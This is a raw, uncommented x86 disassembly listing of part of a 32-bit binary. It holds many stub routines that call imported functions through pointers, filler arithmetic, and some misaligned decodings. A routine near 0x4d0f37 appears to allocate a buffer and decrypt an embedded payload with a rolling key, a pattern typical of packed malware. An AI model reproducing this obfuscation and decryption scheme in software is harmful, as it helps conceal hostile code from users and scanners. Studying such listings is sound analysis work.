  4d07a7:	add    BYTE PTR [edi-0x1],bl
  4d07aa:	adc    eax,0x4d2044
  4d07af:	call   edi
  4d07b1:	add    BYTE PTR [eax],al
  4d07b3:	add    BYTE PTR [edi-0x1],bl
  4d07b6:	adc    eax,0x4d2040
  4d07bb:	call   edi
  4d07bd:	add    BYTE PTR [eax],al
  4d07bf:	add    BYTE PTR [edi-0x1],bl
  4d07c2:	adc    eax,0x4d2084
  4d07c7:	call   edi
  4d07c9:	add    BYTE PTR [eax],al
  4d07cb:	add    BYTE PTR [edi-0x1],bl
  4d07ce:	adc    eax,0x4d2008
  4d07d3:	call   edi
  4d07d5:	add    BYTE PTR [eax],al
  4d07d7:	add    BYTE PTR [edi-0x1],bl
  4d07da:	adc    eax,0x4d20a0
  4d07df:	call   edi
  4d07e1:	add    BYTE PTR [eax],al
  4d07e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07e9:	sub    esp,0x1c
  4d07ec:	mov    edi,0x4d3158
  4d07f1:	or     DWORD PTR [ebp-0x14],ecx
  4d07f4:	push   edi
  4d07f5:	call   0x4d07b4
  4d07fa:	add    esp,0x4
  4d07fd:	pop    edi
  4d07fe:	push   edi
  4d07ff:	push   esi
  4d0800:	push   DWORD PTR [edi+0x140]
  4d0806:	push   ebx
  4d0807:	push   DWORD PTR [edi+0x14c]
  4d080d:	call   0x4d0834
  4d0812:	add    esp,0x10
  4d0815:	pop    edi
  4d0816:	push   edi
  4d0817:	push   0xfffffff4
  4d0819:	call   0x4d0ee4
  4d081e:	add    esp,0x4
  4d0821:	pop    edi
  4d0822:	add    esp,0x1c
  4d0825:	pop    ebp
  4d0826:	ret    
  4d0827:	add    BYTE PTR [edi-0x1],bl
  4d082a:	adc    eax,0x4d2088
  4d082f:	call   edi
  4d0831:	add    BYTE PTR [eax],al
  4d0833:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0839:	sub    esp,0x3c
  4d083c:	lea    ecx,[edi+0x28]
  4d083f:	cmp    ecx,0x54df
  4d0845:	je     0x4d0837
  4d0847:	push   ecx
  4d0848:	mov    edx,0x0
  4d084d:	push   edx
  4d084e:	call   0x4d0bf0
  4d0853:	add    esp,0x4
  4d0856:	pop    ecx
  4d0857:	push   ecx
  4d0858:	push   DWORD PTR [ecx+0x1ec]
  4d085e:	push   DWORD PTR [ecx+0x84]
  4d0864:	push   DWORD PTR [ecx+0x19c]
  4d086a:	push   DWORD PTR [ecx+0x7c]
  4d086d:	call   0x4d0fc8
  4d0872:	add    esp,0x10
  4d0875:	pop    ecx
  4d0876:	push   ecx
  4d0877:	call   0x4d0d98
  4d087c:	add    esp,0x4
  4d087f:	pop    ecx
  4d0880:	add    esp,0x3c
  4d0883:	pop    ebp
  4d0884:	ret    
  4d0885:	add    BYTE PTR [eax],al
  4d0887:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d088d:	sub    esp,0x40
  4d0890:	lea    eax,ds:0x4d3158
  4d0896:	cmp    eax,0x612a
  4d089b:	je     0x4d088b
  4d089d:	push   eax
  4d089e:	push   edx
  4d089f:	push   esi
  4d08a0:	call   0x4d149c
  4d08a5:	add    esp,0x8
  4d08a8:	pop    eax
  4d08a9:	push   eax
  4d08aa:	mov    edx,0x0
  4d08af:	push   edx
  4d08b0:	call   0x4d1088
  4d08b5:	add    esp,0x4
  4d08b8:	pop    eax
  4d08b9:	push   eax
  4d08ba:	push   0x0
  4d08bc:	call   0x4d0acc
  4d08c1:	add    esp,0x4
  4d08c4:	pop    eax
  4d08c5:	add    esp,0x40
  4d08c8:	pop    ebp
  4d08c9:	ret    
  4d08ca:	add    BYTE PTR [eax],al
  4d08cc:	mov    edi,edi
  4d08ce:	push   ebp
  4d08cf:	mov    ebp,esp
  4d08d1:	sub    esp,0x30
  4d08d4:	lea    edx,[eax-0x44]
  4d08d7:	mov    ecx,DWORD PTR [ebp-0x30]
  4d08da:	push   edx
  4d08db:	call   0x4d1288
  4d08e0:	add    esp,0x4
  4d08e3:	pop    edx
  4d08e4:	push   edx
  4d08e5:	push   DWORD PTR [edx+0x94]
  4d08eb:	push   edi
  4d08ec:	call   0x4d14d4
  4d08f1:	add    esp,0x8
  4d08f4:	pop    edx
  4d08f5:	push   edx
  4d08f6:	lea    edx,[edx-0x4c]
  4d08f9:	push   edx
  4d08fa:	call   0x4d0be4
  4d08ff:	add    esp,0x4
  4d0902:	test   eax,eax
  4d0904:	jne    0x4d08f6
  4d0906:	pop    edx
  4d0907:	add    esp,0x30
  4d090a:	pop    ebp
  4d090b:	ret    
  4d090c:	mov    edi,edi
  4d090e:	push   ebp
  4d090f:	mov    ebp,esp
  4d0911:	sub    esp,0x4c
  4d0914:	lea    ebx,[esi+0x1a4]
  4d091a:	adc    esi,edx
  4d091c:	push   ebx
  4d091d:	push   edi
  4d091e:	push   ecx
  4d091f:	push   DWORD PTR [ebx+0x16c]
  4d0925:	push   ecx
  4d0926:	call   0x4d1528
  4d092b:	add    esp,0x10
  4d092e:	pop    ebx
  4d092f:	push   0xfffffff4
  4d0931:	call   0x4d0ee4
  4d0936:	add    esp,0x4
  4d0939:	mov    ecx,0x0
  4d093e:	push   ecx
  4d093f:	call   0x4d1088
  4d0944:	add    esp,0x4
  4d0947:	add    esp,0x4c
  4d094a:	pop    ebp
  4d094b:	ret    
  4d094c:	mov    edi,edi
  4d094e:	push   ebp
  4d094f:	mov    ebp,esp
  4d0951:	sub    esp,0x60
  4d0954:	lea    esi,ds:0x4d3080
  4d095a:	add    DWORD PTR [ebp-0x50],esi
  4d095d:	push   0xfffffff4
  4d095f:	call   0x4d0ee4
  4d0964:	add    esp,0x4
  4d0967:	push   esi
  4d0968:	push   edx
  4d0969:	push   DWORD PTR [esi+0x1c0]
  4d096f:	push   DWORD PTR [esi+0x20]
  4d0972:	call   0x4d0db0
  4d0977:	add    esp,0xc
  4d097a:	pop    esi
  4d097b:	push   0x0
  4d097d:	call   0x4d113c
  4d0982:	add    esp,0x4
  4d0985:	add    esp,0x60
  4d0988:	pop    ebp
  4d0989:	ret    
  4d098a:	add    BYTE PTR [eax],al
  4d098c:	mov    edi,edi
  4d098e:	push   ebp
  4d098f:	mov    ebp,esp
  4d0991:	sub    esp,0x38
  4d0994:	lea    edx,[edi-0x140]
  4d099a:	adc    DWORD PTR [ebp-0x2c],0x56
  4d099e:	push   edx
  4d099f:	mov    ecx,0x0
  4d09a4:	push   ecx
  4d09a5:	call   0x4d0bf0
  4d09aa:	add    esp,0x4
  4d09ad:	pop    edx
  4d09ae:	push   edx
  4d09af:	push   DWORD PTR [edx+0x1fc]
  4d09b5:	push   DWORD PTR [edx+0x180]
  4d09bb:	push   DWORD PTR [edx+0x140]
  4d09c1:	push   edi
  4d09c2:	call   0x4d0d3c
  4d09c7:	add    esp,0x10
  4d09ca:	pop    edx
  4d09cb:	push   edx
  4d09cc:	mov    eax,0x0
  4d09d1:	push   eax
  4d09d2:	call   0x4d1028
  4d09d7:	add    esp,0x4
  4d09da:	pop    edx
  4d09db:	add    esp,0x38
  4d09de:	pop    ebp
  4d09df:	ret    
  4d09e0:	pop    edi
  4d09e1:	call   DWORD PTR ds:0x4d208c
  4d09e7:	call   edi
  4d09e9:	add    BYTE PTR [eax],al
  4d09eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09f1:	sub    esp,0x30
  4d09f4:	lea    eax,[ebx+0x10]
  4d09f7:	mov    DWORD PTR [eax+0x50],0x3eca
  4d09fe:	push   eax
  4d09ff:	push   DWORD PTR [eax+0x24]
  4d0a02:	push   DWORD PTR [eax+0x198]
  4d0a08:	call   0x4d08cc
  4d0a0d:	add    esp,0x8
  4d0a10:	pop    eax
  4d0a11:	push   eax
  4d0a12:	call   0x4d0d98
  4d0a17:	add    esp,0x4
  4d0a1a:	pop    eax
  4d0a1b:	push   eax
  4d0a1c:	lea    ebx,[eax-0x90]
  4d0a22:	push   ebx
  4d0a23:	call   0x4d0be4
  4d0a28:	add    esp,0x4
  4d0a2b:	test   eax,eax
  4d0a2d:	jne    0x4d0a1c
  4d0a2f:	pop    eax
  4d0a30:	add    esp,0x30
  4d0a33:	pop    ebp
  4d0a34:	ret    
  4d0a35:	add    BYTE PTR [eax],al
  4d0a37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a3d:	sub    esp,0x58
  4d0a40:	mov    edx,0x4d300c
  4d0a45:	mov    DWORD PTR [edx+0xe0],eax
  4d0a4b:	push   edx
  4d0a4c:	push   0x0
  4d0a4e:	call   0x4d0ae4
  4d0a53:	add    esp,0x4
  4d0a56:	pop    edx
  4d0a57:	push   edx
  4d0a58:	push   DWORD PTR [edx+0x100]
  4d0a5e:	push   DWORD PTR [edx+0x1b8]
  4d0a64:	push   esi
  4d0a65:	push   edi
  4d0a66:	call   0x4d12e0
  4d0a6b:	add    esp,0x10
  4d0a6e:	pop    edx
  4d0a6f:	push   edx
  4d0a70:	call   0x4d1288
  4d0a75:	add    esp,0x4
  4d0a78:	pop    edx
  4d0a79:	add    esp,0x58
  4d0a7c:	pop    ebp
  4d0a7d:	ret    
  4d0a7e:	add    BYTE PTR [eax],al
  4d0a80:	pop    edi
  4d0a81:	call   DWORD PTR ds:0x4d2010
  4d0a87:	call   edi
  4d0a89:	add    BYTE PTR [eax],al
  4d0a8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a91:	sub    esp,0x60
  4d0a94:	lea    edi,[ebx+0x148]
  4d0a9a:	xor    DWORD PTR [ebp-0x24],ecx
  4d0a9d:	push   edi
  4d0a9e:	push   edx
  4d0a9f:	push   eax
  4d0aa0:	push   esi
  4d0aa1:	call   0x4d098c
  4d0aa6:	add    esp,0xc
  4d0aa9:	pop    edi
  4d0aaa:	push   edi
  4d0aab:	mov    eax,0x0
  4d0ab0:	push   eax
  4d0ab1:	call   0x4d1088
  4d0ab6:	add    esp,0x4
  4d0ab9:	pop    edi
  4d0aba:	push   edi
  4d0abb:	push   0x0
  4d0abd:	call   0x4d1010
  4d0ac2:	add    esp,0x4
  4d0ac5:	pop    edi
  4d0ac6:	add    esp,0x60
  4d0ac9:	pop    ebp
  4d0aca:	ret    
  4d0acb:	add    BYTE PTR [edi-0x1],bl
  4d0ace:	adc    eax,0x4d200c
  4d0ad3:	call   edi
  4d0ad5:	add    BYTE PTR [eax],al
  4d0ad7:	add    BYTE PTR [edi-0x1],bl
  4d0ada:	adc    eax,0x4d2090
  4d0adf:	call   edi
  4d0ae1:	add    BYTE PTR [eax],al
  4d0ae3:	add    BYTE PTR [edi-0x1],bl
  4d0ae6:	adc    eax,0x4d2068
  4d0aeb:	call   edi
  4d0aed:	add    BYTE PTR [eax],al
  4d0aef:	add    BYTE PTR [edi-0x1],bl
  4d0af2:	adc    eax,0x4d2048
  4d0af7:	call   edi
  4d0af9:	add    BYTE PTR [eax],al
  4d0afb:	add    BYTE PTR [edi-0x1],bl
  4d0afe:	adc    eax,0x4d207c
  4d0b03:	call   edi
  4d0b05:	add    BYTE PTR [eax],al
  4d0b07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b0d:	sub    esp,0x24
  4d0b10:	lea    edi,ds:0x4d30ac
  4d0b16:	or     ecx,DWORD PTR [edi+0x10]
  4d0b19:	push   edi
  4d0b1a:	push   0x0
  4d0b1c:	call   0x4d0ae4
  4d0b21:	add    esp,0x4
  4d0b24:	pop    edi
  4d0b25:	push   edi
  4d0b26:	push   DWORD PTR [edi+0x1e0]
  4d0b2c:	push   ebx
  4d0b2d:	call   0x4d0c5c
  4d0b32:	add    esp,0x8
  4d0b35:	pop    edi
  4d0b36:	push   edi
  4d0b37:	mov    esi,0x0
  4d0b3c:	push   esi
  4d0b3d:	call   0x4d0ae4
  4d0b42:	add    esp,0x4
  4d0b45:	pop    edi
  4d0b46:	add    esp,0x24
  4d0b49:	pop    ebp
  4d0b4a:	ret    
  4d0b4b:	add    BYTE PTR [edi-0x1],bl
  4d0b4e:	adc    eax,0x4d206c
  4d0b53:	call   edi
  4d0b55:	add    BYTE PTR [eax],al
  4d0b57:	add    BYTE PTR [edi+0x2b],dl
  4d0b5a:	call   DWORD PTR [edi+0x57]
  4d0b5d:	push   edi
  4d0b5e:	push   edi
  4d0b5f:	call   0x4d07b4
  4d0b64:	sub    esp,0xfffffffc
  4d0b67:	call   0x4d0748
  4d0b6c:	push   0x2
  4d0b6e:	xor    eax,eax
  4d0b70:	adc    eax,0x4d3030
  4d0b75:	push   0x0
  4d0b77:	xor    ecx,ecx
  4d0b79:	adc    ecx,0x4d3036
  4d0b7f:	add    BYTE PTR [ecx],0x41
  4d0b82:	push   eax
  4d0b83:	call   0x4d07a8
  4d0b88:	pop    edi
  4d0b89:	pop    edi
  4d0b8a:	pop    edi
  4d0b8b:	lea    edi,[eax+0x3b]
  4d0b8e:	mov    edi,DWORD PTR [edi]
  4d0b90:	lea    eax,[eax+edi*1]
  4d0b93:	mov    eax,DWORD PTR [eax+0x28]
  4d0b96:	pusha  
  4d0b97:	mov    ah,0x45
  4d0b99:	sub    al,ah
  4d0b9b:	ja     0x4d0754
  4d0ba1:	popa   
  4d0ba2:	ret    
  4d0ba3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ba9:	sub    esp,0x30
  4d0bac:	lea    esi,ds:0x4d301c
  4d0bb2:	cmp    esi,0x7e9c
  4d0bb8:	jbe    0x4d0ba7
  4d0bba:	push   0x0
  4d0bbc:	call   0x4d1028
  4d0bc1:	add    esp,0x4
  4d0bc4:	push   esi
  4d0bc5:	push   DWORD PTR [esi+0x28]
  4d0bc8:	push   ecx
  4d0bc9:	push   DWORD PTR [esi+0x5c]
  4d0bcc:	push   edx
  4d0bcd:	call   0x4d0ef0
  4d0bd2:	add    esp,0x10
  4d0bd5:	pop    esi
  4d0bd6:	call   0x4d07b4
  4d0bdb:	add    esp,0x4
  4d0bde:	add    esp,0x30
  4d0be1:	pop    ebp
  4d0be2:	ret    
  4d0be3:	add    BYTE PTR [edi-0x1],bl
  4d0be6:	adc    eax,0x4d2024
  4d0beb:	call   edi
  4d0bed:	add    BYTE PTR [eax],al
  4d0bef:	add    BYTE PTR [edi-0x1],bl
  4d0bf2:	adc    eax,0x4d205c
  4d0bf7:	call   edi
  4d0bf9:	add    BYTE PTR [eax],al
  4d0bfb:	add    BYTE PTR [edi-0x1],bl
  4d0bfe:	adc    eax,0x4d209c
  4d0c03:	call   edi
  4d0c05:	add    BYTE PTR [eax],al
  4d0c07:	add    BYTE PTR [edi-0x1],bl
  4d0c0a:	adc    eax,0x4d2058
  4d0c0f:	call   edi
  4d0c11:	add    BYTE PTR [eax],al
  4d0c13:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c19:	sub    esp,0x38
  4d0c1c:	mov    ebx,0x4d3058
  4d0c21:	xor    DWORD PTR [ebx-0x30],0xffffe092
  4d0c28:	mov    edi,0x0
  4d0c2d:	push   edi
  4d0c2e:	call   0x4d0ae4
  4d0c33:	add    esp,0x4
  4d0c36:	push   ebx
  4d0c37:	push   DWORD PTR [ebx+0xa0]
  4d0c3d:	push   DWORD PTR [ebx+0x164]
  4d0c43:	call   0x4d13c4
  4d0c48:	add    esp,0x8
  4d0c4b:	pop    ebx
  4d0c4c:	push   0x0
  4d0c4e:	call   0x4d1028
  4d0c53:	add    esp,0x4
  4d0c56:	add    esp,0x38
  4d0c59:	pop    ebp
  4d0c5a:	ret    
  4d0c5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c61:	sub    esp,0x24
  4d0c64:	lea    ebx,ds:0x4d31bc
  4d0c6a:	xor    edx,DWORD PTR [ebp-0x8]
  4d0c6d:	mov    ecx,0x0
  4d0c72:	push   ecx
  4d0c73:	call   0x4d1088
  4d0c78:	add    esp,0x4
  4d0c7b:	push   ebx
  4d0c7c:	push   DWORD PTR [ebx+0x4c]
  4d0c7f:	push   edx
  4d0c80:	push   esi
  4d0c81:	push   DWORD PTR [ebx+0x74]
  4d0c84:	call   0x4d0e94
  4d0c89:	add    esp,0x10
  4d0c8c:	pop    ebx
  4d0c8d:	call   0x4d0d98
  4d0c92:	add    esp,0x4
  4d0c95:	add    esp,0x24
  4d0c98:	pop    ebp
  4d0c99:	ret    
  4d0c9a:	add    BYTE PTR [eax],al
  4d0c9c:	mov    edi,edi
  4d0c9e:	push   ebp
  4d0c9f:	mov    ebp,esp
  4d0ca1:	sub    esp,0x44
  4d0ca4:	lea    edi,[edx-0x2c]
  4d0ca7:	add    DWORD PTR [ebp-0x10],0x4ead
  4d0cae:	push   edi
  4d0caf:	mov    eax,0x0
  4d0cb4:	push   eax
  4d0cb5:	call   0x4d113c
  4d0cba:	add    esp,0x4
  4d0cbd:	pop    edi
  4d0cbe:	push   edi
  4d0cbf:	push   DWORD PTR [edi+0x1a4]
  4d0cc5:	push   DWORD PTR [edi+0x5c]
  4d0cc8:	push   edx
  4d0cc9:	push   DWORD PTR [edi+0x158]
  4d0ccf:	call   0x4d15a8
  4d0cd4:	add    esp,0x10
  4d0cd7:	pop    edi
  4d0cd8:	push   edi
  4d0cd9:	lea    edi,[edi-0x178]
  4d0cdf:	push   edi
  4d0ce0:	call   0x4d0be4
  4d0ce5:	add    esp,0x4
  4d0ce8:	test   eax,eax
  4d0cea:	jne    0x4d0cd9
  4d0cec:	pop    edi
  4d0ced:	add    esp,0x44
  4d0cf0:	pop    ebp
  4d0cf1:	ret    
  4d0cf2:	add    BYTE PTR [eax],al
  4d0cf4:	mov    edi,edi
  4d0cf6:	push   ebp
  4d0cf7:	mov    ebp,esp
  4d0cf9:	sub    esp,0x3c
  4d0cfc:	mov    ebx,0x4d3080
  4d0d01:	xor    edi,DWORD PTR [ebp-0xc]
  4d0d04:	push   ebx
  4d0d05:	push   DWORD PTR [ebx+0x198]
  4d0d0b:	push   edx
  4d0d0c:	push   DWORD PTR [ebx+0x5c]
  4d0d0f:	call   0x4d09ec
  4d0d14:	add    esp,0xc
  4d0d17:	pop    ebx
  4d0d18:	mov    edi,0x0
  4d0d1d:	push   edi
  4d0d1e:	call   0x4d113c
  4d0d23:	add    esp,0x4
  4d0d26:	mov    ecx,0x0
  4d0d2b:	push   ecx
  4d0d2c:	call   0x4d0acc
  4d0d31:	add    esp,0x4
  4d0d34:	add    esp,0x3c
  4d0d37:	pop    ebp
  4d0d38:	ret    
  4d0d39:	add    BYTE PTR [eax],al
  4d0d3b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d41:	sub    esp,0x2c
  4d0d44:	mov    eax,0x4d3094
  4d0d49:	sbb    DWORD PTR [eax+0x110],ecx
  4d0d4f:	push   eax
  4d0d50:	mov    ecx,0x0
  4d0d55:	push   ecx
  4d0d56:	call   0x4d079c
  4d0d5b:	add    esp,0x4
  4d0d5e:	pop    eax
  4d0d5f:	push   eax
  4d0d60:	push   edx
  4d0d61:	push   ecx
  4d0d62:	push   DWORD PTR [eax+0x13c]
  4d0d68:	call   0x4d094c
  4d0d6d:	add    esp,0xc
  4d0d70:	pop    eax
  4d0d71:	push   eax
  4d0d72:	lea    edi,[eax-0x94]
  4d0d78:	push   edi
  4d0d79:	call   0x4d0be4
  4d0d7e:	add    esp,0x4
  4d0d81:	test   eax,eax
  4d0d83:	jne    0x4d0d72
  4d0d85:	pop    eax
  4d0d86:	add    esp,0x2c
  4d0d89:	pop    ebp
  4d0d8a:	ret    
  4d0d8b:	add    BYTE PTR [edi-0x1],bl
  4d0d8e:	adc    eax,0x4d2070
  4d0d93:	call   edi
  4d0d95:	add    BYTE PTR [eax],al
  4d0d97:	add    BYTE PTR [edi-0x1],bl
  4d0d9a:	adc    eax,0x4d2034
  4d0d9f:	call   edi
  4d0da1:	add    BYTE PTR [eax],al
  4d0da3:	add    BYTE PTR [edi-0x1],bl
  4d0da6:	adc    eax,0x4d2004
  4d0dab:	call   edi
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db5:	sub    esp,0x20
  4d0db8:	lea    eax,[esi-0x10]
  4d0dbb:	xor    DWORD PTR [eax+0x78],0x38e8
  4d0dc2:	push   eax
  4d0dc3:	mov    ebx,0x0
  4d0dc8:	push   ebx
  4d0dc9:	call   0x4d1088
  4d0dce:	add    esp,0x4
  4d0dd1:	pop    eax
  4d0dd2:	push   eax
  4d0dd3:	push   DWORD PTR [eax+0x1ac]
  4d0dd9:	push   DWORD PTR [eax+0x10c]
  4d0ddf:	push   edx
  4d0de0:	push   ebx
  4d0de1:	call   0x4d0c14
  4d0de6:	add    esp,0x10
  4d0de9:	pop    eax
  4d0dea:	push   eax
  4d0deb:	mov    ebx,0x0
  4d0df0:	push   ebx
  4d0df1:	call   0x4d079c
  4d0df6:	add    esp,0x4
  4d0df9:	pop    eax
  4d0dfa:	add    esp,0x20
  4d0dfd:	pop    ebp
  4d0dfe:	ret    
  4d0dff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e05:	sub    esp,0x30
  4d0e08:	lea    eax,[ecx+0x38]
  4d0e0b:	add    DWORD PTR [ebp-0x10],edx
  4d0e0e:	push   eax
  4d0e0f:	push   DWORD PTR [eax+0x1a8]
  4d0e15:	push   esi
  4d0e16:	push   esi
  4d0e17:	push   edx
  4d0e18:	call   0x4d06f8
  4d0e1d:	add    esp,0x10
  4d0e20:	pop    eax
  4d0e21:	push   eax
  4d0e22:	mov    esi,0x0
  4d0e27:	push   esi
  4d0e28:	call   0x4d1088
  4d0e2d:	add    esp,0x4
  4d0e30:	pop    eax
  4d0e31:	push   eax
  4d0e32:	call   0x4d0d98
  4d0e37:	add    esp,0x4
  4d0e3a:	pop    eax
  4d0e3b:	add    esp,0x30
  4d0e3e:	pop    ebp
  4d0e3f:	ret    
  4d0e40:	pop    edi
  4d0e41:	call   DWORD PTR ds:0x4d2078
  4d0e47:	call   edi
  4d0e49:	add    BYTE PTR [eax],al
  4d0e4b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e51:	sub    esp,0x1c
  4d0e54:	lea    ecx,ds:0x4d3058
  4d0e5a:	add    DWORD PTR [ebp-0x10],ebx
  4d0e5d:	push   ecx
  4d0e5e:	push   DWORD PTR [ecx+0x28]
  4d0e61:	push   DWORD PTR [ecx+0x1ac]
  4d0e67:	push   DWORD PTR [ecx+0x1b4]
  4d0e6d:	call   0x4d10e4
  4d0e72:	add    esp,0xc
  4d0e75:	pop    ecx
  4d0e76:	push   ecx
  4d0e77:	push   0x0
  4d0e79:	call   0x4d0bf0
  4d0e7e:	add    esp,0x4
  4d0e81:	pop    ecx
  4d0e82:	push   ecx
  4d0e83:	push   0x0
  4d0e85:	call   0x4d113c
  4d0e8a:	add    esp,0x4
  4d0e8d:	pop    ecx
  4d0e8e:	add    esp,0x1c
  4d0e91:	pop    ebp
  4d0e92:	ret    
  4d0e93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e99:	sub    esp,0x28
  4d0e9c:	lea    eax,[ebx-0x100]
  4d0ea2:	or     edi,DWORD PTR [eax-0x70]
  4d0ea5:	push   eax
  4d0ea6:	mov    edx,0x0
  4d0eab:	push   edx
  4d0eac:	call   0x4d0ae4
  4d0eb1:	add    esp,0x4
  4d0eb4:	pop    eax
  4d0eb5:	push   eax
  4d0eb6:	push   DWORD PTR [eax+0xac]
  4d0ebc:	push   esi
  4d0ebd:	push   edi
  4d0ebe:	push   DWORD PTR [eax+0x9c]
  4d0ec4:	call   0x4d1148
  4d0ec9:	add    esp,0x10
  4d0ecc:	pop    eax
  4d0ecd:	push   eax
  4d0ece:	mov    esi,0x0
  4d0ed3:	push   esi
  4d0ed4:	call   0x4d1034
  4d0ed9:	add    esp,0x4
  4d0edc:	pop    eax
  4d0edd:	add    esp,0x28
  4d0ee0:	pop    ebp
  4d0ee1:	ret    
  4d0ee2:	add    BYTE PTR [eax],al
  4d0ee4:	pop    edi
  4d0ee5:	call   DWORD PTR ds:0x4d2000
  4d0eeb:	call   edi
  4d0eed:	add    BYTE PTR [eax],al
  4d0eef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ef5:	sub    esp,0x58
  4d0ef8:	mov    ebx,0x4d3078
  4d0efd:	xor    esi,DWORD PTR [ebp-0x58]
  4d0f00:	mov    eax,0x0
  4d0f05:	push   eax
  4d0f06:	call   0x4d0da4
  4d0f0b:	add    esp,0x4
  4d0f0e:	push   ebx
  4d0f0f:	push   DWORD PTR [ebx+0xb0]
  4d0f15:	push   DWORD PTR [ebx+0x118]
  4d0f1b:	call   0x4d1414
  4d0f20:	add    esp,0x8
  4d0f23:	pop    ebx
  4d0f24:	mov    eax,0x0
  4d0f29:	push   eax
  4d0f2a:	call   0x4d1088
  4d0f2f:	add    esp,0x4
  4d0f32:	add    esp,0x58
  4d0f35:	pop    ebp
  4d0f36:	ret    
  4d0f37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f3d:	sub    esp,0x4c
  4d0f40:	add    ebx,DWORD PTR [esi-0x30]
  4d0f43:	lea    ebx,[esi-0xe4]
  4d0f49:	push   0x6ac
  4d0f4e:	push   0x6ac
  4d0f53:	mov    eax,0x40001
  4d0f58:	push   eax
  4d0f59:	mov    edx,0x862985c6
  4d0f5e:	push   DWORD PTR [edx+0x7a239a86]
  4d0f64:	sub    DWORD PTR [esp],0x2
  4d0f68:	mov    edx,0x4d2044
  4d0f6d:	pop    DWORD PTR [edx]
  4d0f6f:	call   0x4d07a8
  4d0f74:	add    esp,0x4
  4d0f77:	push   eax
  4d0f78:	pop    DWORD PTR [ebx+0x48]
  4d0f7b:	mov    esi,DWORD PTR [ebx+0x48]
  4d0f7e:	mov    ecx,esi
  4d0f80:	sub    eax,eax
  4d0f82:	dec    eax
  4d0f83:	and    eax,0x4d0014
  4d0f88:	mov    esi,0xd5d9a824
  4d0f8d:	mov    edx,0x6ac
  4d0f92:	cmp    edx,0x0
  4d0f95:	je     0x4d0fb3
  4d0f97:	add    edx,0xfffffffc
  4d0f9a:	xor    edi,edi
  4d0f9c:	push   DWORD PTR [eax+edi*1]
  4d0f9f:	add    DWORD PTR [esp],esi
  4d0fa2:	pop    DWORD PTR [ecx+edi*2]
  4d0fa5:	dec    DWORD PTR [ecx]
  4d0fa7:	xor    esi,esi
  4d0fa9:	add    esi,DWORD PTR [eax]
  4d0fab:	add    eax,0x4
  4d0fae:	add    ecx,0x4
  4d0fb1:	jmp    0x4d0f92
  4d0fb3:	lea    ecx,[ebx-0x4]
  4d0fb6:	push   ecx
  4d0fb7:	call   0x4d0be4
  4d0fbc:	add    esp,0x4
  4d0fbf:	test   eax,eax
  4d0fc1:	jne    0x4d0fb4
  4d0fc3:	add    esp,0x4c
  4d0fc6:	pop    ebp
  4d0fc7:	ret    
  4d0fc8:	mov    edi,edi
  4d0fca:	push   ebp
  4d0fcb:	mov    ebp,esp
  4d0fcd:	sub    esp,0x2c
  4d0fd0:	lea    esi,[ecx-0x128]
  4d0fd6:	mov    ecx,esi
  4d0fd8:	mov    ecx,0x0
  4d0fdd:	push   ecx
  4d0fde:	call   0x4d1010
  4d0fe3:	add    esp,0x4
  4d0fe6:	push   esi
  4d0fe7:	push   DWORD PTR [esi+0x14]
  4d0fea:	push   edx
  4d0feb:	push   eax
  4d0fec:	push   DWORD PTR [esi+0x194]
  4d0ff2:	call   0x4d0a38
  4d0ff7:	add    esp,0x10
  4d0ffa:	pop    esi
  4d0ffb:	mov    ecx,0x0
  4d1000:	push   ecx
  4d1001:	call   0x4d0ae4
  4d1006:	add    esp,0x4
  4d1009:	add    esp,0x2c
  4d100c:	pop    ebp
  4d100d:	ret    
  4d100e:	add    BYTE PTR [eax],al
  4d1010:	pop    edi
  4d1011:	call   DWORD PTR ds:0x4d2018
  4d1017:	call   edi
  4d1019:	add    BYTE PTR [eax],al
  4d101b:	add    BYTE PTR [edi-0x1],bl
  4d101e:	adc    eax,0x4d2074
  4d1023:	call   edi
  4d1025:	add    BYTE PTR [eax],al
  4d1027:	add    BYTE PTR [edi-0x1],bl
  4d102a:	adc    eax,0x4d201c
  4d102f:	call   edi
  4d1031:	add    BYTE PTR [eax],al
  4d1033:	add    BYTE PTR [edi-0x1],bl
  4d1036:	adc    eax,0x4d2054
  4d103b:	call   edi
  4d103d:	add    BYTE PTR [eax],al
  4d103f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1045:	sub    esp,0x1c
  4d1048:	mov    edx,0x4d316c
  4d104d:	xor    ecx,DWORD PTR [edx-0x10]
  4d1050:	push   edx
  4d1051:	mov    eax,0x0
  4d1056:	push   eax
  4d1057:	call   0x4d0bf0
  4d105c:	add    esp,0x4
  4d105f:	pop    edx
  4d1060:	push   edx
  4d1061:	push   DWORD PTR [edx+0x4]
  4d1064:	push   esi
  4d1065:	push   esi
  4d1066:	push   edi
  4d1067:	call   0x4d1190
  4d106c:	add    esp,0x10
  4d106f:	pop    edx
  4d1070:	push   edx
  4d1071:	mov    eax,0x0
  4d1076:	push   eax
  4d1077:	call   0x4d0acc
  4d107c:	add    esp,0x4
  4d107f:	pop    edx
  4d1080:	add    esp,0x1c
  4d1083:	pop    ebp
  4d1084:	ret    
  4d1085:	add    BYTE PTR [eax],al
  4d1087:	add    BYTE PTR [edi-0x1],bl
  4d108a:	adc    eax,0x4d202c
  4d108f:	call   edi
  4d1091:	add    BYTE PTR [eax],al
  4d1093:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1099:	sub    esp,0x34
  4d109c:	lea    ecx,[ebx-0xe8]
  4d10a2:	cmp    ecx,0xe1a
  4d10a8:	je     0x4d1097
  4d10aa:	push   ecx
  4d10ab:	push   DWORD PTR [ecx+0x190]
  4d10b1:	push   DWORD PTR [ecx+0x180]
  4d10b7:	push   DWORD PTR [ecx+0xf8]
  4d10bd:	push   eax
